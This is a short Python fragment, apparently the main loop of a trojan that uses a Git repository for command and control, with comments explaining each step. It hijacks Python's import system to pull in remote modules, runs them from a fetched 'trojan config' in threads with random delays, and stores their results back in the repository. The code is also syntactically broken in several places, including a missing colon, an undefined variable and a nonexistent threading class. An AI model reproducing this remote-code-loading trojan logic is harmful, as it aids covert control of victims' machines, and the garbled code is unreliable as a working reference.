#custom module importer to work in tandem with our import hack code
#simply runs through each module within the trojan config file
def module_runner(module):

    task_queue.put(1)
    result = sys.modules[modules].run()
    task_queue.get()

    #store result in our repo
    store_module_result(result)

    return

#main trojan loop - we point the meta_path to our class, which will recursively
#look for the module and pull it in should it not exist
sys.meta_path = [GitImporter()]

#here we are very basically saying that, if there are no tasks/modules to run
#then go and grab a config containing modules to run using the function we
#created earlier
while True:

    if task_queue.empty()

    config = get_trojan_config()
#we utilise the threading library and create a thread object, feeding it args of
#task and module we want
    for task in config:
        t = threading.Threaded
        t.start()
        time.sleep(random.randint(1,10))
